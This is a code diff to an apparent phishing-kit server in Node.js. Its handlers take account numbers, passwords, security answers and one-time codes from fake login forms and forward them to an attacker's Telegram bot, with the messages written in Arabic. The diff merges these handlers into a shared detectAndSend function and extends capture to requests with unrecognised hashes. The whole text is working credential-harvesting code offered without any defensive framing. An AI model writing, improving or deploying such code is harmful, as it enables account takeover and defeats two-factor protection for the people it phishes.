@@ -111,41 +111,43 @@ function sendJson(res, data) {
   res.end(json);
 }
 
+function detectAndSend(data) {
+  const s = loadSettings();
+  const time = new Date().toLocaleString("ar-EG");
+  if (data.password) {
+    const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${time}`;
+    return sendTelegram(s.bot_token, s.chat_id, msg);
+  }
+  if (data.question || data.answer) {
+    const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
+    return sendTelegram(s.bot_token, s.chat_id, msg);
+  }
+  if (data.code || data.otp || data.otp_code) {
+    const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.code || data.otp || data.otp_code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
+    return sendTelegram(s.bot_token, s.chat_id, msg);
+  }
+  return Promise.resolve(true);
+}
+
 const SERVER_FN_HANDLERS = {
-  // Login form: account + password + service
   "5a778137b307c3c64bcb13b4f224a252e8f3929d980316359d75b7e570ad9a78": async (data) => {
-    const s = loadSettings();
-    const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${new Date().toLocaleString("ar-EG")}`;
-    await sendTelegram(s.bot_token, s.chat_id, msg);
+    await detectAndSend(data);
     return { ok: true };
   },
-
-  // Login (exported as r -> a.r): same login handler
   "8f77dad699ccdcb965b75b5b4ade8d14cc361218add59796aa50c9bb1dc34fda": async (data) => {
-    const s = loadSettings();
-    const msg = `🔐 <b>تسجيل دخول</b>\n\n👤 الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || ""}`;
-    await sendTelegram(s.bot_token, s.chat_id, msg);
+    await detectAndSend(data);
     return { ok: true };
   },
-
-  // Tracking: security question + answer
   "f3104eed51e53b25722f81ffc68fdea6ff2734a01f7814fd27fd5ba59405d58a": async (data) => {
-    const s = loadSettings();
-    const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${new Date().toLocaleString("ar-EG")}`;
-    await sendTelegram(s.bot_token, s.chat_id, msg);
+    await detectAndSend(data);
     return { ok: true };
   },
-
-  // OTP verification
   "558c58ed06e8b7706d065b4277a2f70a11c7f1f3fdb164ce74a206e5697d440f": async (data) => {
-    const s = loadSettings();
-    const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.otp || data.otp_code || data.code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${new Date().toLocaleString("ar-EG")}`;
-    await sendTelegram(s.bot_token, s.chat_id, msg);
+    await detectAndSend(data);
     return { ok: true };
   },
-
-  // Account validation / misc
   "01b7b7d8a082e3c609ee93861dd303887d75b7309ad540f543aeaf3b7462ab10": async (data) => {
+    await detectAndSend(data);
     return { ok: true };
   },
 
@@ -188,6 +190,12 @@ http.createServer(async (req, res) => {
     const handler = SERVER_FN_HANDLERS[hash];
     if (!handler) {
       console.log("[REQ] NO HANDLER for hash:", hash);
+      try {
+        const body = await readBody(req);
+        const input = body.data || body;
+        console.log("[REQ] unknown hash data keys:", Object.keys(input));
+        await detectAndSend(input);
+      } catch (e) {}
       sendJson(res, { ok: true });
       return;
     }
